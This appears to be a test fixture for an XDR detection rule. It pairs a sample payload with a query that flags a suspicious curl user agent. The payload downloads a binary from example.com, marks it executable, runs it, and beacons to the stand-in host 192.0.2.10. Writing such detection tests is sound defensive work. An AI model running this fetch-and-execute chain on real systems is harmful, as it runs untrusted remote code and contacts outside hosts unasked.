payload.code:
mkdir -p /tmp/scratch
wget -O /tmp/scratch/curl_sample https://example.com/curl_binary
chmod +x /tmp/scratch/curl_sample
/tmp/scratch/curl_sample -H "User-Agent: " -X GET http://192.0.2.10:8080/beacon

biocs.name: Suspicious curl user agent

biocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter actor_process_image_name = '/tmp/scratch/curl_sample'
| filter action_process_image_name = '/usr/bin/curl'
| filter action_remote_ip = '192.0.2.10'
| filter action_file_path = '/tmp/scratch/curl_sample'
